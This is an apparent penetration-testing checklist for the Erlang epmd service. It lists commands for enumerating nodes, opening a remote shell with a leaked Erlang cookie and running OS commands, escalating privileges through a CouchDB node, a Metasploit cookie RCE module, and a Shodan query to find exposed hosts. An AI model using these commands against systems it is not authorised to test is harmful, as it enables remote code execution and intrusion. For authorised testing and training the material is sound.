# Erlang Port Mapper Daemon (epmd) Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating epmd (port 4369), I realistically expect to find:

- [ ] Erlang node names and their listening ports
- [ ] Internal service names (RabbitMQ, CouchDB)
- [ ] Exposure of management or cluster ports for further attacks
- [ ] Erlang cookie value if leaked (leading to RCE)
- [ ] No direct file access, but pivot opportunities inside internal networks

---

## ‚úÖ epmd Pentest Checklist

- [ ] **Banner Grabbing**
  - Quickly test if the service responds.
    ```
    echo -n -e "\x00\x01\x6e" | nc -vn <IP> 4369
    ```

- [ ] **Nmap Scan**
  - Run NSE script to list node names and ports.
    ```
    nmap -sV -Pn -n -T4 -p 4369 --script epmd-info <IP>
    ```

- [ ] **Manual Node Enumeration with Erlang**
  - Get list of registered nodes.
    ```erlang
    erl
    1> net_adm:names('<IP>').
    ```

---

## ‚úÖ Erlang Cookie Attack (If Cookie Is Leaked)

- [ ] **Connect with Cookie**
  - Start remote shell to the target node.
    ```bash
    erl -setcookie <COOKIE> -name attacker@<YourIP> -remsh target@<TargetIP>
    ```
  - Test command execution.
    ```erlang
    os:cmd("id").
    ```

---

## ‚úÖ Local Privilege Escalation (Example with CouchDB)

- [ ] **Connect Locally with Cookie**
    ```bash
    HOME=/ erl -sname shell -setcookie <COOKIE>
    ```
  - Exploit vulnerable CouchDB node.
    ```erlang
    (shell@localhost)1> rpc:call('couchdb@localhost', os, cmd, ["whoami"]).
    "couchdb\n"
    ```

---

## ‚úÖ Metasploit Modules

- **Check or Exploit Cookie RCE**
    ```
    use exploit/multi/misc/erlang_cookie_rce
    ```

---

## ‚úÖ Shodan Search

- [ ] Discover exposed EPMD nodes on the Internet.
    ```
    port:4369 "at port"
    ```

---
